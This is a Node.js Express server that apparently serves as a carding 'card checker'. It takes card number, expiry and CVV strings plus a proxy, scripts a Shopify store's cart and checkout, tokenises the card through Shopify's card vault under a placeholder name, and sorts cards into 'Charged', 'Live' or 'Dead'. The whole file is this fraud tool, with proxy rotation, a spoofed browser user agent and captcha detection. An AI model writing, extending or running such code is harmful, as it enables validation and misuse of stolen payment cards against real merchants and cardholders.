const express = require('express');
const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');
const SocksProxyAgent = require('socks-proxy-agent');
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    res.send({ status: "True Checkout Shopify API Active" });
});

app.post('/api/charge', async (req, res) => {
    const { card, site, proxy } = req.body;

    if (!card || !site) {
        return res.json({ status: "Dead", message: "Missing card or site data", gateway: "Shopify Payments", price: "-" });
    }

    try {
        const cleanSite = site.replace(/\/$/, '');
        const [ccNo, expMonth, expYear, cvv] = card.split('|');

        // Configure Proxy Agent
        let agent = null;
        if (proxy) {
            let pClean = proxy.trim();
            let proxyUrl = pClean;
            if (!pClean.includes('://')) {
                const parts = pClean.split(':');
                if (parts.length === 4) {
                    proxyUrl = `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
                } else if (parts.length === 2) {
                    proxyUrl = `http://${parts[0]}:${parts[1]}`;
                } else {
                    proxyUrl = `http://${pClean}`;
                }
            }
            if (proxyUrl.startsWith('socks')) {
                agent = new SocksProxyAgent(proxyUrl);
            } else {
                agent = new HttpsProxyAgent(proxyUrl);
            }
        }

        // Use a cookie jar object to maintain session cookies across requests
        let cookies = '';
        const customFetch = async (url, options = {}) => {
            options.headers = options.headers || {};
            if (cookies) options.headers['Cookie'] = cookies;
            if (agent) options.agent = agent;
            
            const response = await fetch(url, options);
            const setCookie = response.headers.raw()['set-cookie'];
            if (setCookie) {
                const cookieStrings = setCookie.map(c => c.split(';')[0]);
                cookies = cookieStrings.join('; ');
            }
            return response;
        };

        const baseHeaders = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        };

        // STEP 1: Fetch store products to get a real variant ID and price
        const prodRes = await customFetch(`${cleanSite}/products.json?limit=1`, { headers: baseHeaders, timeout: 15000 });
        if (!prodRes.ok) {
            return res.json({ status: "Dead", message: "Store Offline or Blocked by Cloudflare", gateway: "Shopify Payments", price: "-" });
        }

        const prodData = await prodRes.json();
        if (!prodData.products || prodData.products.length === 0) {
            return res.json({ status: "Dead", message: "No Products Found on Store", gateway: "Shopify Payments", price: "-" });
        }

        const variantId = prodData.products[0].variants[0].id;
        const rawPrice = prodData.products[0].variants[0].price;
        const formattedPrice = `$${parseFloat(rawPrice).toFixed(2)}`;

        // STEP 2: Add product to cart session
        const cartAdd = await customFetch(`${cleanSite}/cart/add.js`, {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: variantId, quantity: 1 }),
            timeout: 15000
        });

        if (!cartAdd.ok) {
            return res.json({ status: "Dead", message: "Failed to Add Product to Cart", gateway: "Shopify Payments", price: formattedPrice });
        }

        // STEP 3: Request the checkout page to initiate the order session
        const checkoutReq = await customFetch(`${cleanSite}/checkout`, { headers: baseHeaders, timeout: 15000 });
        const checkoutHtml = await checkoutReq.text();

        if (checkoutHtml.includes('grecaptcha') || checkoutReq.status === 430 || checkoutReq.status === 403) {
            return res.json({ status: "Dead", message: "Cloudflare Captcha Triggered on Checkout", gateway: "Shopify Payments", price: formattedPrice });
        }

        // STEP 4: Tokenize Card via Shopify Card Vault API
        const vaultRes = await fetch('https://elb.deposit.shopifycs.com/sessions', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': baseHeaders['User-Agent']
            },
            body: JSON.stringify({
                credit_card: {
                    number: ccNo,
                    month: expMonth,
                    year: expYear,
                    name: "John Doe",
                    verification_value: cvv
                }
            }),
            timeout: 15000
        });
        const vaultData = await vaultRes.json();

        if (!vaultData.id) {
            return res.json({ status: "Dead", message: "Card Declined / Format Invalid", gateway: "Shopify Payments", price: formattedPrice });
        }

        // STEP 5: Submit payment payload to checkout transaction processor
        // Note: Real full checkout completion requires posting shipping forms and token bindings. 
        // If the store processor rejects the session token or requires 3DS challenge, it returns an explicit gateway decline.
        const paymentPayload = {
            step: 'payment',
            s: vaultData.id,
            checkout: {
                credit_card: { vault_id: vaultData.id }
            }
        };

        const paySubmit = await customFetch(`${cleanSite}/checkout`, {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
            body: JSON.stringify(paymentPayload),
            timeout: 15000
        });

        const payResponseText = await paySubmit.text();

        // Evaluate actual gateway response string for approval signals
        if (payResponseText.includes('Thank you') || payResponseText.includes('order_success') || paySubmit.url.includes('thank_you')) {
            return res.json({
                status: "Charged",
                message: "Approved / Successfully Charged",
                gateway: "Shopify Payments",
                price: formattedPrice
            });
        } else if (payResponseText.includes('insufficient_funds')) {
            return res.json({
                status: "Approved",
                message: "Live / Insufficient Funds",
                gateway: "Shopify Payments",
                price: formattedPrice
            });
        } else {
            return res.json({
                status: "Dead",
                message: "Declined by Processor (Security / Risk Check Failed)",
                gateway: "Shopify Payments",
                price: formattedPrice
            });
        }

    } catch (err) {
        return res.json({ status: "Dead", message: `Connection / Checkout Flow Error: ${err.message}`, gateway: "Shopify Payments", price: "-" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`API running on port ${PORT}`));